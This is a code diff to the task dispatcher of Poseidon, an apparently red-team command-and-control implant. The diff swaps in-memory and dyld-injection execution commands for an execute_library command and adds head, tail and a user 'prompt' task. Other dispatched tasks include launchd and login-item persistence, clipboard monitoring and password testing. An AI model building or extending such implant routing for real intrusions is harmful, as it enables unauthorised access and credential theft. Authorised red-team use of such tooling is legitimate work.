@@ -8,11 +8,10 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/curl"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/download"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/drives"
-	dyldinject "github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/dyld_inject"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/execute_macho"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/execute_memory"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/execute_library"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/getenv"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/getuser"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/head"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport_call"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jxa"
@@ -28,10 +27,12 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mv"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/persist_launchd"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/persist_loginitem"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/runtimeMainThread"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/portscan"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/print_c2"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/print_p2p"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/prompt"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ps"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pty"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pwd"
@@ -44,6 +45,7 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sleep"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/socks"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sshauth"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/tail"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/tcc_check"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/test_password"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/triagedirectory"
@@ -132,8 +134,6 @@ func listenForNewTask() {
 			go listtasks.Run(task)
 		case "list_entitlements":
 			go list_entitlements.Run(task)
-		case "execute_memory":
-			go execute_memory.Run(task)
 		case "jsimport":
 			go jsimport.Run(task)
 		case "jsimport_call":
@@ -142,9 +142,6 @@ func listenForNewTask() {
 			go persist_launchd.Run(task)
 		case "persist_loginitem":
 			go persist_loginitem.Run(task)
-		case "dyldinject":
-			// Execute spawn_libinject command to spawn a target application/binary with the DYLD_INSERT_LIBRARIES variable set to an arbitrary dylib
-			go dyldinject.Run(task)
 		case "link_tcp":
 			go link_tcp.Run(task)
 		case "unlink_tcp":
@@ -153,8 +150,8 @@ func listenForNewTask() {
 			go run.Run(task)
 		case "clipboard_monitor":
 			go clipboard_monitor.Run(task)
-		case "execute_macho":
-			go execute_macho.Run(task)
+		case "execute_library":
+			go execute_library.Run(task)
 		case "rpfwd":
 			go rpfwd.Run(task)
 		case "print_p2p":
@@ -169,6 +166,12 @@ func listenForNewTask() {
 			go tcc_check.Run(task)
 		case "test_password":
 			go test_password.Run(task)
+		case "tail":
+			go tail.Run(task)
+		case "head":
+			go head.Run(task)
+		case "prompt":
+			go runtimeMainThread.DoOnMainThread(prompt.Run, task)
 		default:
 			// No tasks, do nothing
 			break
